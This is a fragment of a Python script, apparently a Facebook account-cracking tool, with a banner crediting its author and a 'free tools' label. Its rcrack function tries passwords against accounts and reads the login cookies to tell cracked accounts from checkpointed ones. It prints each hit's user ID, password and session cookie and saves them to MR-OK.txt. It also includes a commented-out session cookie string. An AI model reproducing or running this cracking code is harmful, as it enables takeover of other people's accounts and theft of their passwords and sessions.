...
\033[1;97m====================================================
[+] EDITOR   : MAGHFOOR
[+] FACEBOOK  : GANGESTER MOHAMMADI 
[+] TOOLS     : FREE
[+] VERSION   : \033[1;92m0.0
\033[1;97m[+]\033[1;91m THANKS FORM AFGHAN
\033[1;97m====================================================""")  
def lines():
	print('\033[1;97m====================================================')
...
def rcrack(uid,pwx,tl):
    ...
    # 'cookie': 'datr=pcHrZUGq9UqCT6AccT52oBbV; sb=pcHrZQg-A10SJ-s8qgwuiRx4; ps_l=0; ps_n=0; m_pixel_ratio=2.7437500953674316; wd=394x526; fr=0q7IBrMtVfpIzy5h1..Bl68Gl..AAA.0.0.Bl7SYJ.AWXgHhzETnQ',
    'dpr': '2.74375',
    ...
    'viewport-width': '394',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[MR -OK] '+cid+' | '+ps+'\033[0;97m\n[]\033[0;37m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                open('MR-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[MR-CP] '+uid+' | '+ps+'\x1b[1;97m')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mZABI\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
